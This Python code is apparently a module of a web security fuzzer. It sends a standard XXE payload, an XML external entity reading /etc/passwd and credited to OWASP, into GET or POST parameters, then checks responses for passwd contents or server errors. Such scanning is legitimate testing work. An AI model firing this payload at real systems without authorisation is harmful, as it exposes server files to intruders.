class XXE:
    # from https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing
    def get_XXE_payload(self):
        return '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>'

    def verifyXXE(self, response, param, requestId):
        try:
            if response.status_code>=500:
                print "Potential XXE in "+requestId+" "+param
            else:
                response.text.index('root:x:0:0:root')
                print "XXE found in "+requestId+" "+param
                return True
        except:
            return False

    def testXXE(self, method, url, requestId, param, postData=None):
        s=requests.Session()
        if method=='GET':
            newUrl = Fuzz.substParam(url,param,self.get_XXE_payload())
            self.catchUp(s)
            response = self.send_req(requestId, s, newUrl, 'GET')
            print "Attempting GET XXE on "+param
            self.verifyXXE(response, param, requestId)
        elif method=='POST':
            newPost=copy.deepcopy(postData)
            newPost['formData'][param]=self.get_XXE_payload()
            self.catchUp(s)
            response = self.send_req(requestId, s, url, 'POST', post=newPost)
            print "Attempting GET XXE on "+param
            self.verifyXXE(response, param, requestId)
